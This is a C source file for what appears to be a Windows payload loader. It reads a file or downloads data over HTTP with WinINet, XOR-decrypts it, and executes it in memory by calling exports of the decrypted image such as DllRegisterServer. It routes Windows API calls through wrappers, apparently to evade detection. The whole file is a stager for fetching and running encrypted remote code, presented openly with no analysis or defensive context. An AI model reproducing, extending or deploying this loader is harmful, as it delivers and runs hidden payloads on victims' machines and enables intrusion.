#include "loader.h"

VOID Load(LPVOID PEbase) {
	LPVOID loaderBase = GetPEProcAddress(PEbase,RtlVirtuallUnwind);
	if (loaderBase == NULL) {
		return;
	}
	LONG_PTR DllHandle;
	BOOL result = ((BOOL(*)(LONG_PTR*))loaderBase)(&DllHandle);
	if (result) {
		LPVOID entryPoint = _GetProcAddress((LPVOID)DllHandle, DllRegisterServer);
		if (entryPoint!= NULL) {
			((VOID(*)())entryPoint)();
		}
	}
}

VOID LoadFromFile(PCHAR fileName, PCHAR xorKey) {
	if (fileName == NULL) {
		return;
	}
	HANDLE hFile = _CreateFileA(fileName);
	if (hFile == INVALID_HANDLE_VALUE) {
		return ;
	}
	DWORD fileSize = _GetFileSize(hFile);
	if (fileSize == 0) {
		return;
	}
	LPVOID fileData = _VirtualAlloc(fileSize);
	if (fileData == NULL) {
		return;
	}
	DWORD bytesRead;
	if (!_ReadFile(hFile, fileData, fileSize, &bytesRead)) {
		return;
	}
	if (xorKey != NULL) {
		XorDecrypt(fileData, fileSize, xorKey);
	}
	return Load(fileData);
}


VOID LoadFromUrl(PCHAR url, PCHAR xorKey) {
	DWORD protocolHash = 0;
	CHAR host[256] = { 0 };
	DWORD port = 0;
	CHAR path[1024] = { 0 };
	if (!ParseUrl(url, &protocolHash, host, &port, path)) {
		return;
	}
	HINTERNET hInternet = _InternetOpenA();
	if (hInternet == NULL) {
		return;
	}
	HINTERNET hConnect = _InternetConnectA(hInternet, host, port);
	if (hConnect == NULL) {
		_InternetCloseHandle(hInternet);
		return;
	}
	HINTERNET hRequest = _HttpOpenRequestA(hConnect,path,protocolHash);
	if (hRequest == NULL) {
		_InternetCloseHandle(hInternet);
		return;
	}
	if (!_HttpSendRequestA(hRequest)) {
		_InternetCloseHandle(hInternet);
		return;
	}
	DWORD dwStatus = HTTP_STATUS_OK;
	DWORD dwStatusSize = sizeof(dwStatus);
	if (!_HttpQueryInfoA(hRequest, &dwStatus, &dwStatusSize) || dwStatus != HTTP_STATUS_OK) {
		_InternetCloseHandle(hInternet);
		return;
	}
	LPVOID data = _VirtualAlloc(MAX_SIZE);
	if (data == NULL) {
		_InternetCloseHandle(hInternet);
		return;
	}
	DWORD total = 0;
	DWORD bytes = 0;
	CHAR buffer[0x2000] ={ 0 };
	while (_InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes) && bytes > 0) {
		if (total + bytes > MAX_SIZE) {
			_InternetCloseHandle(hInternet);
			return;
		}
		memcpy((PBYTE)data + total, buffer, bytes);
		total += bytes;
	}
	_InternetCloseHandle(hInternet);
	if (xorKey != NULL) {
		XorDecrypt(data, total, xorKey);
	}
	return Load(data);
}